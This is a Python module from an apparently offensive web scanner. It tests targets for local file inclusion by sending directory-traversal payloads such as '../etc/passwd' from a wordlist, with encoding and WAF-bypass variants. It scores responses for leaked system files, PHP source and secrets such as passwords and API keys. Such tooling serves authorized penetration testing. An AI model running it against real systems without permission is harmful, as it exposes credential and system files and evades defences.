from .utils import attack
from .rich_output import (
    colors,
    print_error,
    print_success,
    print_info,
    print_vulnerable,
)
from .Encoding import EncodingBypass
from .WafBypass import WafBypass, WafSignatures
import re


class Detection:
    def __init__(self, attack_instance):
        self.attack_instance = attack_instance
        self.waf_detected = None
        self.vulnerability_confidence = 0

    def detect(self):
        print(
            colors(
                f"[~] Detection mode enabled for {self.attack_instance.__class__.__name__}",
                93,
            )
        )

        # Perform initial WAF detection
        self.detect_waf()

        # Check available bypass options
        use_encoding = (
            hasattr(self.attack_instance, "use_encoding")
            and self.attack_instance.use_encoding
        )
        use_waf_bypass = (
            hasattr(self.attack_instance, "use_waf_bypass")
            and self.attack_instance.use_waf_bypass
        )

        vulnerabilities_found = []

        with open(
            "payload_wordlists/directory_traversal_list.txt", "r"
        ) as payload_file:
            payloads = payload_file.readlines()

            for payload in payloads:
                payload = payload.strip()
                test_payloads = [payload]

                # Generate encoding variants if enabled
                if use_encoding:
                    test_payloads.extend(EncodingBypass.generate_all_variants(payload))

                # Generate WAF bypass variants if enabled
                if use_waf_bypass:
                    test_payloads.extend(
                        WafBypass.generate_waf_bypass_variants(payload)
                    )

                if len(test_payloads) > 1:
                    print(
                        colors(
                            f"[~] Testing {len(test_payloads)} variants for payload: {payload}",
                            94,
                        )
                    )

                for test_payload in test_payloads:
                    try:
                        response = self.attack_instance.attack(test_payload)
                        if response:
                            vuln_result = self.analyze_response(response, test_payload)
                            if vuln_result["is_vulnerable"]:
                                vulnerabilities_found.append(vuln_result)
                                print_vulnerable(f"Payload: {test_payload}")
                                print(
                                    colors(
                                        f"[+] Confidence: {vuln_result['confidence']}%",
                                        92,
                                    )
                                )
                                print(
                                    colors(
                                        f"[+] Evidence: {vuln_result['evidence'][:100]}...",
                                        94,
                                    )
                                )
                    except Exception as e:
                        continue  # Skip failed requests

        if vulnerabilities_found:
            self.report_vulnerabilities(vulnerabilities_found)
        else:
            print(colors("[-] LFI vulnerability not detected.", 91))

    def detect_waf(self):
        """Perform initial WAF detection with a benign payload"""
        try:
            # Test with a benign payload first
            test_response = self.attack_instance.attack("../etc/passwd")
            if test_response:
                self.waf_detected = WafSignatures.detect_waf(
                    test_response.text, test_response.headers
                )
                if self.waf_detected:
                    print(colors(f"[!] WAF detected: {self.waf_detected.upper()}", 93))
                else:
                    print(colors("[~] No WAF detected", 94))
        except Exception:
            print(colors("[~] WAF detection failed", 94))

    def analyze_response(self, response, payload):
        """Advanced response analysis for vulnerability detection"""
        confidence = 0
        evidence = ""
        is_vulnerable = False

        text = response.text
        status_code = response.status_code
        headers = response.headers
        content_length = len(text)

        # File content analysis
        linux_indicators = [
            ("root:", 80, "Linux /etc/passwd file"),
            ("bin/bash", 70, "Linux shell configuration"),
            ("daemon:", 75, "Linux system user"),
            ("www-data:", 75, "Web server user"),
            ("nobody:", 70, "System user"),
            ("/bin/sh", 65, "Shell reference"),
            ("/sbin/nologin", 60, "System account"),
        ]

        windows_indicators = [
            ("[boot loader]", 85, "Windows boot.ini file"),
            ("[fonts]", 80, "Windows system configuration"),
            ("for 16-bit app support", 75, "Windows compatibility"),
            ("WINNT", 70, "Windows system directory"),
            ("System32", 70, "Windows system directory"),
        ]

        php_indicators = [
            ("<?php", 90, "PHP source code exposure"),
            ("<?=", 85, "PHP short tags"),
            ("php.ini", 80, "PHP configuration file"),
            ("display_errors", 75, "PHP error configuration"),
            ("mysqli", 60, "Database configuration"),
        ]

        config_indicators = [
            ("mysql:", 70, "Database configuration"),
            ("postgres:", 70, "PostgreSQL configuration"),
            ("redis:", 65, "Redis configuration"),
            ("password=", 80, "Password in configuration"),
            ("secret_key", 75, "Secret key exposure"),
            ("api_key", 75, "API key exposure"),
            ("DB_PASSWORD", 80, "Database password"),
        ]

        all_indicators = (
            linux_indicators + windows_indicators + php_indicators + config_indicators
        )

        # Check for vulnerability indicators
        for indicator, weight, description in all_indicators:
            if indicator.lower() in text.lower():
                confidence += weight
                evidence = f"{description}: {indicator}"
                is_vulnerable = True
                break

        # Response analysis
        if status_code == 200 and content_length > 500:
            confidence += 20  # Bonus for substantial content
        elif status_code == 403:
            confidence -= 30  # Penalty for forbidden
        elif status_code == 404:
            confidence -= 50  # Major penalty for not found

        # Content-type analysis
        content_type = headers.get("content-type", "").lower()
        if "text/plain" in content_type or "application/octet-stream" in content_type:
            confidence += 15  # Bonus for plain text (possible file content)

        # Error pattern analysis (potential false positive)
        error_patterns = [
            "error",
            "exception",
            "warning",
            "fatal",
            "not found",
            "access denied",
            "permission denied",
        ]
        for pattern in error_patterns:
            if pattern in text.lower():
                confidence -= 20
                break

        # Time-based analysis (basic)
        response_time = getattr(response, "elapsed", None)
        if response_time and response_time.total_seconds() > 5:
            confidence += 10  # Slow response might indicate file processing

        # Normalize confidence
        confidence = max(0, min(100, confidence))

        return {
            "is_vulnerable": is_vulnerable and confidence > 50,
            "confidence": confidence,
            "evidence": evidence or "Response analysis",
            "payload": payload,
            "status_code": status_code,
            "content_length": content_length,
            "response_time": response_time.total_seconds() if response_time else 0,
        }

    def report_vulnerabilities(self, vulnerabilities):
        """Generate a comprehensive vulnerability report"""
        print(colors("\n[+] VULNERABILITY SUMMARY", 92))
        print(colors("=" * 50, 92))

        for i, vuln in enumerate(vulnerabilities, 1):
            print(colors(f"[{i}] Vulnerability Found", 92))
            print(colors(f"    Payload: {vuln['payload']}", 94))
            print(colors(f"    Confidence: {vuln['confidence']}%", 94))
            print(colors(f"    Evidence: {vuln['evidence']}", 94))
            print(colors(f"    Status Code: {vuln['status_code']}", 94))
            print(colors(f"    Content Length: {vuln['content_length']}", 94))
            if vuln["response_time"]:
                print(colors(f"    Response Time: {vuln['response_time']:.2f}s", 94))
            print("")

        # Recommendations
        print(colors("[~] RECOMMENDATIONS", 93))
        if self.waf_detected:
            print(
                colors(
                    f"    - WAF detected ({self.waf_detected}): Consider WAF bypass techniques",
                    93,
                )
            )
        print(colors("    - Verify findings manually", 93))
        print(colors("    - Test with different file paths", 93))
        print(colors("    - Check for additional input vectors", 93))

    def is_vulnerable(self, text):
        """Legacy method for backward compatibility"""
        result = self.analyze_response(
            type(
                "MockResponse",
                (),
                {"text": text, "status_code": 200, "headers": {}, "elapsed": None},
            )(),
            "legacy_check",
        )
        return result["is_vulnerable"]
